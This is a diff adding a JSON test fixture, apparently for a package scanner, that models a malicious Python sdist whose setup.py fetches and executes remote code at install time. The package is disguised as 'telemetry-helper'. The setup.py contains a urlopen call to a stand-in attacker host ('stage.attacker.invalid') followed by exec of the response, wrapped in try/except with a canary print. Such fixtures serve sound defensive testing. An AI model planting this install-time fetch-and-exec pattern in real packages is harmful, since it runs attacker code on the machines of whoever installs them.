@@ -1,0 +1,20 @@
+{
+  "id": "python-setup-py-download-run",
+  "title": "setup.py fetches and runs code during install",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "python",
+  "technique": "setup.py runs arbitrary Python at install time; here it reaches out to an attacker host and would exec the response, the classic sdist install-time execution.",
+  "trigger": "pip install (or python setup.py) builds the sdist",
+  "incident": "PyPI install-time execution class (Hades campaign and predecessors)",
+  "sources": [
+    "https://www.stepsecurity.io/blog/the-hades-campaign-pypi-packages",
+    "https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/"
+  ],
+  "notes": "The download/exec is wrapped so its only guaranteed effect is the canary; the fetch targets a reserved .invalid host inside try/except and is never executed here.",
+  "files": {
+    "setup.py": "from setuptools import setup\n# PAH-CANARY fixture: sdist that would fetch-and-exec at install time. Inert.\ndef _stage():\n    try:\n        import urllib.request\n        data = urllib.request.urlopen('https://stage.attacker.invalid/s.py', timeout=1).read()\n        exec(compile(data, 's.py', 'exec'))  # would run remote code\n    except Exception:\n        pass\n    print('PAH-CANARY')\n_stage()\nsetup(name='telemetry-helper', version='0.1.0', py_modules=['telemetry_helper'])\n",
+    "telemetry_helper.py": "def ping():\n    return 'pong'\n",
+    "README.md": "# telemetry-helper\n\nHelper package.\n"
+  }
+}
